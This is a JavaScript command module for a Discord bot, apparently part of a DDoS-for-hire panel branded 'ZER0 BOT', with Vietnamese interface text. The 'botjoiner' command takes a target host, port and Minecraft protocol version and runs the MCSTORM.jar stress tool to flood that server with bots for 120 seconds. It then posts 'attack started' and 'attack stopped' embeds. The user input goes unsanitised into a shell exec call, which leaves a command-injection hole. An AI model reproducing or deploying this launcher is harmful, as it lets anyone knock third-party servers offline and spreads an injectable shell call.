const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const protocol = message.content.split (" ")[3]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Mẫu ;botjoiner 1.1.1.1 25565 47`")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar ${host}:${port} ${protocol} botjoiner 120 -1`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Cuộc tấn công đã dừng lại ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **ZER0 BOT** 🔥')
	.setTimestamp()
	.setDescription("**► Cuộc tấn công đã dừng lại 💥**")
	.setFooter('© Developer: zxcr9999#1770.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 120000); //time in milliseconds
var gifler = ["https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif" , "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Một cuộc tấn công khởi chạy ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **ZER0 BOT** 🔥')
	.setTimestamp()
	.setDescription("**Người Dùng**: `" + message.author.username + "` \n **Máy Chủ**: `" + host + "` \n **Cổng**: `" + port + "` \n **Phiên Bản**: `" + protocol + "`\n \n **Phương thức**: `BotJoiner 💥` \n **Số lượng Bot**: `10.000 🚀` \n **Thời gian**: `120 giây 🕒`")
	.setFooter('© Developer: zxcr9999#1770.', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['botjoiner'],
  permLevel: 0
}

exports.help = {
  name: 'botjoiner',
  description: 'zxcr9999',
  usage: 'botjoiner'
}